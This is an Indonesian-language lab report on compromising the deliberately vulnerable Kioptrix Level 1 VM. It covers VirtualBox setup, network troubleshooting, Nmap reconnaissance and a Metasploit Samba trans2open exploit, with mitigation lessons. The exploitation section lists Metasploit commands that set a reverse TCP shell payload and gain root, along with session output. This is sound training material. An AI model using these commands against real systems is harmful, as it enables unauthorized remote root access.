# Laporan Praktik: Eksploitasi Kioptrix Level 1 (Samba trans2open)

**Tujuan:** Latihan keamanan siber (penetration testing) di lingkungan lab terisolasi, menggunakan target VM yang lebih beragam dari Metasploitable2 — fokus pada eksploitasi **buffer overflow** pada service Samba versi lama, sekaligus latihan troubleshooting setup lab virtualisasi dari command line.

**Lingkungan lab:**
- Target: Kioptrix Level 1 (`192.168.56.102`) — VM boot-to-root dari VulnHub, dirilis ~2010
- Attacker: terminal host langsung (bukan VM attacker terpisah)
- Jaringan: VirtualBox Host-only Adapter (`vboxnet0`, subnet `192.168.56.0/24`), terisolasi dari internet dan LAN nyata
- Tools: VBoxManage (CLI), Nmap, Metasploit Framework

> ⚠️ Semua teknik di laporan ini hanya sah dipakai pada sistem milik sendiri atau dengan izin eksplisit. Kioptrix sengaja dibuat rentan untuk tujuan edukasi, didownload dari sumber resmi (vulnhub.com), bukan mirror pihak ketiga yang tidak terverifikasi.

---

## Ringkasan Alur

```
1. Download & verifikasi sumber (VulnHub resmi, hindari mirror mencurigakan)
        ↓
2. Setup VM via VBoxManage CLI (bukan GUI)
        ↓
3. Troubleshooting network: Internal Network → Host-only, DHCP disabled, NIC type mismatch
        ↓
4. Reconnaissance (Nmap)
        ↓
5. Identifikasi celah: Apache/mod_ssl 2.8.4 & Samba (trans2open)
        ↓
6. Eksploitasi via Metasploit → akses shell root
```

---

## Tahap 1 — Verifikasi Sumber Download

Pencarian "Kioptrix Level 1 download" sempat mengarah ke halaman pihak ketiga dengan ciri *content farm* (teks ganjil seperti "Upgrade Tech" menyelip di tengah konten teknis, domain tidak resmi). Sumber yang benar tetap:

```
https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
```

Dua opsi link download resmi dari halaman tersebut:
- `http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar` (situs author asli, tapi HTTP tidak terenkripsi)
- `https://download.vulnhub.com/kioptrix/Kioptrix_Level_1.rar` (mirror VulnHub, HTTPS — dipilih untuk keamanan transfer)

**Catatan keamanan:** verifikasi checksum (MD5/SHA1) yang tertera di halaman VulnHub setelah download, sebelum extract dan dijalankan — praktik yang sama relevansinya dengan pelajaran supply chain attack di laporan vsftpd sebelumnya.

---

## Tahap 2 — Setup VM via Command Line

GUI VirtualBox tidak dipakai; seluruh setup dilakukan lewat `VBoxManage`:

```bash
VBoxManage createvm --name "Kioptrix_Level_1" --ostype "Linux26" --register
VBoxManage modifyvm "Kioptrix_Level_1" --memory 512 --cpus 1
VBoxManage storagectl "Kioptrix_Level_1" --name "IDE Controller" --add ide
VBoxManage storageattach "Kioptrix_Level_1" --storagectl "IDE Controller" \
  --port 0 --device 0 --type hdd \
  --medium "/home/admin/Downloads/Kioptix Level 1/Kioptix Level 1.vmdk"
```

Saat boot pertama, muncul dialog **"Hardware Discovery Utility"** — OS mendeteksi NIC virtual (Intel PRO/1000) berbeda dari NIC asli VM ini (AMD PCnet, sesuai era pembuatannya tahun 2010). Dipilih **"Keep Configuration"** untuk mempertahankan konfigurasi network yang sudah ada di image.

---

## Tahap 3 — Troubleshooting Jaringan

Ini bagian paling memakan waktu di seluruh praktik — tiga masalah terpisah yang harus diselesaikan berurutan.

### Masalah 1: Internal Network tidak menjangkau host

VM awalnya di-set dengan `--nic1 intnet` (Internal Network, nama `labnet`). Karena serangan dilakukan **langsung dari terminal host** (bukan dari VM attacker terpisah), mode ini tidak bisa dipakai — Internal Network hanya menghubungkan VM-ke-VM, host tidak ikut serta sama sekali.

**Solusi:** pindah ke Host-only Adapter, yang menyertakan host sebagai anggota jaringan:
```bash
VBoxManage modifyvm "Kioptrix_Level_1" --nic1 hostonly --hostonlyadapter1 vboxnet0
```

### Masalah 2: DHCP server nonaktif

Setelah pindah ke Host-only, scan `nmap -sn 192.168.56.0/24` tetap hanya menampilkan 2 host (`.1` = interface host, `.100` = ternyata alamat **DHCP server VirtualBox itu sendiri**, bukan device nyata). Dicek dengan:
```bash
VBoxManage list hostonlyifs
```
Statusnya `DHCP: Disabled`. Diaktifkan:
```bash
VBoxManage dhcpserver modify --netname HostInterfaceNetworking-vboxnet0 --enable
```
Verifikasi:
```bash
VBoxManage list dhcpservers
# Enabled: Yes
```

### Masalah 3: NIC type tidak cocok dengan hardware asli VM

Setelah DHCP aktif, Kioptrix tetap tidak mendapat IP baru. Penyebabnya: NIC virtual terpasang bertipe **82540EM** (Intel PRO/1000), sedangkan OS mempertahankan konfigurasi lama yang terikat ke NIC **AMD PCnet** (karena "Keep Configuration" di Tahap 2) — sehingga interface baru tidak pernah melakukan request DHCP.

**Solusi:** ganti tipe NIC agar sesuai hardware asli image:
```bash
VBoxManage controlvm "Kioptrix_Level_1" poweroff
VBoxManage modifyvm "Kioptrix_Level_1" --nictype1 Am79C973    # PCnet-FAST III
VBoxManage startvm "Kioptrix_Level_1" --type gui
```

Setelah reboot dengan NIC type yang sesuai, dialog "Hardware Discovery" tidak muncul lagi dan interface network langsung aktif dengan DHCP:
```bash
nmap -sn 192.168.56.0/24
# 192.168.56.102 — Kioptrix berhasil terdeteksi
```

---

## Tahap 4 — Reconnaissance

```bash
nmap -sV -sC -p 22,80,111,139,443,32768 192.168.56.102
```

**Hasil:**

| Port | Layanan | Versi |
|---|---|---|
| 22 | SSH | OpenSSH 2.9p2 (protocol 1.99, mendukung SSHv1) |
| 80 | HTTP | Apache 1.3.20 (Unix) mod_ssl/2.8.4 OpenSSL/0.9.6b |
| 111 | rpcbind | v2 |
| 139 | netbios-ssn | Samba smbd (workgroup: MYGROUP) |
| 443 | HTTPS | Apache 1.3.20, mod_ssl/2.8.4 — mendukung SSLv2 (deprecated) |
| 32768 | status | RPC #100024 |

Dua kandidat celah teridentifikasi dari versi service:
1. **Apache mod_ssl 2.8.4 + OpenSSL 0.9.6b** — kombinasi versi yang dikenal rentan CVE-2002-0082 (exploit populer bernama "OpenFuck"), namun module ini sudah tidak tersedia di Metasploit versi modern (`search mod_ssl` tidak menghasilkan apa pun).
2. **Samba (trans2open buffer overflow)** — dipilih sebagai jalur eksploitasi karena module-nya masih tersedia di Metasploit.

---

## Tahap 5 — Eksploitasi: Samba trans2open Buffer Overflow

### Latar belakang kerentanan

Modul `exploit/linux/samba/trans2open` mengeksploitasi buffer overflow pada fungsi `trans2open` di Samba versi lama (2.2.0–2.2.8). Karena ini serangan **memory corruption** (bukan backdoor atau credential guessing), eksploitasinya membutuhkan menebak **return address** yang tepat di memory korban — exploit mencoba beberapa alamat secara berurutan sampai salah satu berhasil membelokkan eksekusi ke payload.

### Percobaan pertama — payload Meterpreter (gagal)

```
use exploit/linux/samba/trans2open
set RHOSTS 192.168.56.102
set LHOST 192.168.56.1
run
```

Beberapa sesi Meterpreter sempat terbuka (`Sending stage (1079144 bytes)`) tapi langsung mati (`Reason: Died`). Payload Meterpreter berukuran besar (~1 MB staged) membuat proses negosiasi stage rentan gagal pada exploit buffer overflow setua ini.

### Percobaan kedua — payload shell sederhana (berhasil)

Payload diganti ke command shell biasa yang jauh lebih ringan (36 bytes):
```
set PAYLOAD linux/x86/shell/reverse_tcp
set LPORT 4444
run
```

**Hasil:**
```
[*] 192.168.56.102:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (192.168.56.1:4444 -> 192.168.56.102:32773)
[*] Command shell session 6 opened (192.168.56.1:4444 -> 192.168.56.102:32774)
[*] Command shell session 7 opened (192.168.56.1:4444 -> 192.168.56.102:32775)
[*] Command shell session 8 opened (192.168.56.1:4444 -> 192.168.56.102:32776)
```

Beberapa sesi terbuka sekaligus karena lebih dari satu return address yang dicoba ternyata valid. Sesi 5 sempat invalid saat dicoba interaksi (`Invalid session identifier: 5` — mati cepat, karakteristik umum shell hasil buffer overflow yang tidak selalu stabil). Interaksi berhasil pada sesi berikutnya:

```
sessions -i 6
```

### Verifikasi akses

```bash
whoami
```
```
root
```

Akses **root didapat langsung dari exploit**, tanpa tahap privilege escalation tambahan — berbeda dari skenario privilege escalation manual (SUID nmap) pada laporan Metasploitable2 sebelumnya.

---

## Analisis Teknis

| Aspek | Detail |
|---|---|
| Root cause | Buffer overflow pada parsing request `trans2open` di Samba versi lama |
| Teknik | Remote memory corruption exploit, bukan credential-based atau backdoor |
| Payload size matters | Payload kecil (shell biasa) jauh lebih reliable daripada payload besar (Meterpreter staged) pada exploit buffer overflow dengan address brute-forcing |
| Privilege | Langsung root — karena proses `smbd` yang dieksploitasi berjalan dengan privilege root di konfigurasi default VM ini |
| Beda dari laporan sebelumnya | Metasploitable2 (vsftpd) = backdoor sengaja disisipkan; Metasploitable2 (SUID) = misconfiguration permission; Kioptrix (trans2open) = kerentanan **asli** di kode aplikasi (memory safety bug) |

---

## Temuan & Pelajaran Keamanan

1. **Memory safety bug tetap jadi vektor serius** — buffer overflow pada Samba ini murni bug di kode C, bukan kesalahan konfigurasi admin. Bahasa yang tidak memory-safe (C/C++) rawan bug kelas ini; software modern mulai beralih ke bahasa memory-safe atau hardening tambahan (ASLR, stack canary) untuk mitigasi.
2. **Payload size mempengaruhi reliabilitas eksploitasi** — pada exploit yang bergantung pada brute-force memory address, payload kecil punya peluang sukses lebih tinggi dibanding payload besar yang kompleks (observasi praktis, bukan cuma teori).
3. **Service yang berjalan sebagai root memperbesar dampak** — proses `smbd` yang di-compromise otomatis memberi akses root penuh; prinsip least privilege (menjalankan service dengan user non-root) akan membatasi dampak eksploitasi semacam ini.
4. **Hardening modern menutup celah ini** — ASLR (Address Space Layout Randomization), yang sudah jadi standar di kernel Linux modern, akan membuat teknik "trying return address" pada exploit ini jauh lebih sulit berhasil karena alamat memory tidak lagi statis/predictable.

---

## Lampiran: Troubleshooting yang Dihadapi

| Masalah | Penyebab | Solusi |
|---|---|---|
| VM tidak muncul di scan host | NIC di-set Internal Network, bukan Host-only | `VBoxManage modifyvm ... --nic1 hostonly --hostonlyadapter1 vboxnet0` |
| Host-only subnet hanya menampilkan 2 IP (host + DHCP server) | DHCP server pada `vboxnet0` berstatus disabled | `VBoxManage dhcpserver modify --netname ... --enable` |
| VM tetap tidak dapat IP meski DHCP aktif | NIC type (Intel 82540EM) tidak cocok dengan konfigurasi network lama di image (AMD PCnet) | `VBoxManage modifyvm ... --nictype1 Am79C973` |
| Dialog "Hardware Discovery Utility" saat boot | OS mendeteksi NIC baru berbeda dari yang dikenal sebelumnya | Pilih "Keep Configuration" (lalu perbaiki NIC type agar sesuai) |
| `search mod_ssl` kosong di Metasploit | Module exploit untuk CVE-2002-0082 sudah di-deprecate dari Metasploit modern | Gunakan jalur eksploitasi alternatif (Samba trans2open) |
| Sesi Meterpreter terbuka lalu langsung "Died" | Payload staged terlalu besar untuk stabilitas buffer overflow ini | Ganti ke payload shell sederhana (`linux/x86/shell/reverse_tcp`) |
| `Invalid session identifier` | Sesi command shell mati cepat setelah terbuka (karakteristik umum exploit ini) | Interact secepat mungkin ke sesi berikutnya yang masih hidup (`sessions -l` → `sessions -i <nomor>`) |

---

## Catatan Etika

Seluruh praktik ini dilakukan pada VM lab pribadi yang terisolasi (Host-only network), bukan sistem produksi atau milik pihak lain. Teknik buffer overflow exploitation tanpa izin eksplisit terhadap sistem pihak lain adalah tindak pidana di hampir semua yurisdiksi.
